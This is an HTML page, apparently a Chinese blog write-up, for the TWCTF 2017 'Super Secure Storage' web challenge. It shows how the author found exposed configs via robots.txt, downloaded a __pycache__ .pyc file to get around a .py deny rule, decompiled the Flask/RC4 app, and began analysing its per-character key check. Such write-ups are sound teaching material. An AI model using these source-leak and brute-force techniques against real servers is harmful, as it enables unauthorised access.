@@ -1,0 +1,1182 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="TWCTF 2017-Super Secure Storage-writeuppython缓存 RC4 爆破
+重点：这是web题，不是Crypto">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TWCTF 2017-Super Secure Storage-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="TWCTF 2017-Super Secure Storage-writeuppython缓存 RC4 爆破
+重点：这是web题，不是Crypto">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/1.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/2.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/3.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/6.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/7.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/8.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/10.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/11.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/14.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/16.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/17.png?raw=true">
+<meta property="og:updated_time" content="2017-09-05T13:14:12.290Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TWCTF 2017-Super Secure Storage-writeup">
+<meta name="twitter:description" content="TWCTF 2017-Super Secure Storage-writeuppython缓存 RC4 爆破
+重点：这是web题，不是Crypto">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/1.png?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/"/>
+
+
+
+
+
+  <title> TWCTF 2017-Super Secure Storage-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                TWCTF 2017-Super Secure Storage-writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-05T15:47:56+08:00">
+                2017-09-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" class="leancloud_visitors" data-flag-title="TWCTF 2017-Super Secure Storage-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>TWCTF 2017-Super Secure Storage-writeup<br>python缓存 RC4 爆破</p>
+<p>重点：这是web题，不是Crypto<br><a id="more"></a></p>
+<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/#/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/1.png?raw=true" alt=""></p>
+<p>先观察一下基本的功能。你可以输入数据，和一个密钥，发送到服务器端后会加密返回加密后的数据和对应的id。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/2.png?raw=true" alt=""></p>
+<p>用扫描器扫后发现有robots.txt，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Disallow: /super_secret_secure_shared_directory_for_customer/</div></pre></td></tr></table></figure></p>
+<p>接着访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/super_secret_secure_shared_directory_for_customer/</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/3.png?raw=true" alt=""></p>
+<p>securestorage.conf的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  listen 80;</div><div class="line">  server_name s3.chal.ctf.westerns.tokyo;</div><div class="line">  root /srv/securestorage;</div><div class="line">  index index.html;</div><div class="line"></div><div class="line">  location / &#123;</div><div class="line">    try_files $uri $uri/ @app;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  location @app &#123;</div><div class="line">    include uwsgi_params;</div><div class="line">    uwsgi_pass unix:///tmp/uwsgi.securestorage.sock;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  location ~ (\.py|\.sqlite3)$ &#123;</div><div class="line">    deny all;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>securestorage.ini的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[uwsgi]</div><div class="line">chdir = /srv/securestorage</div><div class="line">uid = www-data</div><div class="line">gid = www-data</div><div class="line">module = app</div><div class="line">callable = app</div><div class="line">socket = /tmp/uwsgi.securestorage.sock</div><div class="line">chmod-socket = 666</div><div class="line">vacuum = true</div><div class="line">die-on-term = true</div><div class="line">logto = /var/log/uwsgi/securestorage.log</div><div class="line">processes = 8</div><div class="line"></div><div class="line">env = SECRET_KEY=**CENSORED**</div><div class="line">env = KEY=**CENSORED**</div><div class="line">env = FLAG=**CENSORED**</div></pre></td></tr></table></figure></p>
+<p>从以上文件，我们可以知道这是一个python服务端程序，主程序为app.py，直接访问<a href="http://s3.chal.ctf.westerns.tokyo/app.py" target="_blank" rel="external">http://s3.chal.ctf.westerns.tokyo/app.py</a> 会返回403 Forbidden。</p>
+<p>在 python-web 应用中，当前目录下， <code>.py</code>文件生成的<code>pyc</code>文件会被存储在  <code>__pycache__</code>文件夹中，并以 <code>.cpython-XX.pyc</code> 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 <code>__pycache__/app.cpython-35.pyc</code>（这里的35是我假设的）。我们尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-35.pyc</div></pre></td></tr></table></figure></p>
+<p>发现成功的下载了pyc文件，然后用工具将其反编译回源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, request</div><div class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> os</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///./db.sqlite3'</span></div><div class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="keyword">True</span></div><div class="line">app.secret_key = os.environ[<span class="string">'SECRET_KEY'</span>]</div><div class="line">db = SQLAlchemy(app)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span><span class="params">(db.Model)</span>:</span></div><div class="line">    __tablename__ = <span class="string">'data'</span></div><div class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</div><div class="line">    key = db.Column(db.String)</div><div class="line">    data = db.Column(db.String)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, data)</span>:</span></div><div class="line">        self.key = key</div><div class="line">        self.data = data</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;Data id:&#123;&#125;, key:&#123;&#125;, data:&#123;&#125;&gt;'</span>.format(self.id, self.key, self.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key=app.secret_key)</span>:</span></div><div class="line">        self.stream = self.PRGA(self.KSA(key))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, c)</span>:</span></div><div class="line">        <span class="keyword">return</span> chr(ord(c) ^ next(self.stream))</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KSA</span><span class="params">(key)</span>:</span></div><div class="line">        keylen = len(key)</div><div class="line">        S = list(range(<span class="number">256</span>))</div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">            j = j + S[i] + ord(key[i % keylen]) &amp; <span class="number">255</span></div><div class="line">            S[i], S[j] = S[j], S[i]</div><div class="line"></div><div class="line">        <span class="keyword">return</span> S</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRGA</span><span class="params">(S)</span>:</span></div><div class="line">        i = <span class="number">0</span></div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            i = i + <span class="number">1</span> &amp; <span class="number">255</span></div><div class="line">            j = j + S[i] &amp; <span class="number">255</span></div><div class="line">            S[i], S[j] = S[j], S[i]</div><div class="line">            <span class="keyword">yield</span> S[S[i] + S[j] &amp; <span class="number">255</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.before_first_request</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    db.create_all()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> Data.query.get(<span class="number">1</span>):</div><div class="line">        key = os.environ[<span class="string">'KEY'</span>]</div><div class="line">        data = os.environ[<span class="string">'FLAG'</span>]</div><div class="line">        rc4 = RC4()</div><div class="line">        enckey = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> key:</div><div class="line">            enckey += rc4.enc(c)</div><div class="line"></div><div class="line">        rc4 = RC4(key)</div><div class="line">        encdata = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> data:</div><div class="line">            encdata += rc4.enc(c)</div><div class="line"></div><div class="line">        flag = Data(enckey, encdata)</div><div class="line">        db.session.add(flag)</div><div class="line">        db.session.commit()</div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">()</span>:</span></div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'data'</span>, <span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    key, data = req[<span class="string">'key'</span>], req[<span class="string">'data'</span>]</div><div class="line">    <span class="keyword">if</span> len(key) &lt; <span class="number">8</span> <span class="keyword">or</span> len(data) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    enckey = <span class="string">''</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> key:</div><div class="line">        enckey += rc4.enc(c)</div><div class="line"></div><div class="line">    encdata = <span class="string">''</span></div><div class="line">    rc4 = RC4(key)</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</div><div class="line">        encdata += rc4.enc(c)</div><div class="line"></div><div class="line">    newdata = Data(enckey, encdata)</div><div class="line">    db.session.add(newdata)</div><div class="line">    db.session.commit()</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>, id=newdata.id, data=newdata.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data/&lt;int:data_id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>, data=data.data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/api/data/&lt;int:data_id&gt;/check', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    enckey, key = data.key, req[<span class="string">'key'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verify(enckey, key):</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure></p>
+<p>app.py 的工作流程约莫如下：</p>
+<ol>
+<li>建立第一个连接时通过init()，用RC4算法，先通过KEY得到enckey，再用enckey来加密FLAG，并保存到sqlite数据库中，对应的id为 1。</li>
+<li>我们访问页面，传入数据和密钥，app.py通过new()，用RC4算法进行加密，并保存到sqlite数据库中，并返回加密的数据和对应的id。</li>
+<li>通过id，访问 /api/data/<int:data_id> ，可以通过data()获得对应id的加密数据。</int:data_id></li>
+<li>在页面中输入密钥，访问 /api/data/<int:data_id>/check ，可以通过check()对对应id的加密数据进行解密，并返回明文。</int:data_id></li>
+</ol>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170905/5.png?raw=true" alt=""><br>上图返回的即为加密后的flag。</p>
+<p>看一下check()函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(data_id)</span>:</span></div><div class="line">    data = Data.query.get(data_id)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    req = request.json</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">'key'</span>]:</div><div class="line">        <span class="keyword">if</span> k <span class="keyword">not</span>-<span class="keyword">in</span> req:</div><div class="line">            <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line"></div><div class="line">    enckey, key = data.key, req[<span class="string">'key'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verify(enckey, key):</div><div class="line">        <span class="keyword">return</span> jsonify(result=<span class="keyword">False</span>)</div><div class="line">    <span class="keyword">return</span> jsonify(result=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
+<p>传入data_id，如果对应id的加密数据不存在中返回false，如果json数据格式包中没有key字段，直接返回false。之后通过<code>enckey, key = data.key, req[&#39;key&#39;]</code>，将加密数据用的enckey和我们传入的key分别保存到变量enckey和变量key中。接着利用verify(enckey, key)来判断key是否正确。接下来看一下verify()函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(enc_pass, input_pass)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(enc_pass) != len(input_pass):</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    rc4 = RC4()</div><div class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(enc_pass, input_pass):</div><div class="line">        <span class="keyword">if</span> x != rc4.enc(y):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
+<p>首先是enc_pass和input_pass长度要相等。接着用<code>zip(enc_pass, input_pass)</code>，利用for循环，对input_pass的每个字母进行加密后，与enc_pass的每个字母进行比较，若有不同则返回false。所以这里要过两个关：</p>
+<ol>
+<li>长度</li>
+<li>对应的字母相等。</li>
+</ol>
